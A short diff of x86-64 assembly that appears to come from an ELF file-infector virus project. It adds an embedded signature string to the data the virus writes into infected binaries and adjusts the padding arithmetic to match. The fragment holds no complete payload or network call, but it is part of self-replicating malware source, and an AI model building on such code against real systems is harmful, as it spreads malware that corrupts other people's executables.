@@ -233,11 +233,13 @@ mimic:
     write_rel r8, [rbp - 32], 0xc
     write_rel r8, [rel hook.folder_1], 11
     write_rel r8, [rel hook.folder_2], 12
-    write_rel r8, [rel hook.TMP], 10
+    write_rel r8, [rel hook.TMP], 9
+    write_rel r8, [rel hook.sig], 38
 ; write padding
     PAGE_ALIGN FAMINE_SIZE
     sub rcx, FAMINE_SIZE
-    sub rcx, 45                                                     ; jmp entry + vars
+    sub rcx, 44                                                     ; jmp entry + vars
+    sub rcx, 38
     mov r9, rcx
     .loop:
         cmp r9, 0
@@ -309,6 +311,8 @@ hook:
         db FOLDER_2, 0
     .TMP:
         db TMP, 0
+    .sig:
+        db SIGNATURE, 0
     .null:
         db 0
 %ifdef DEBUG
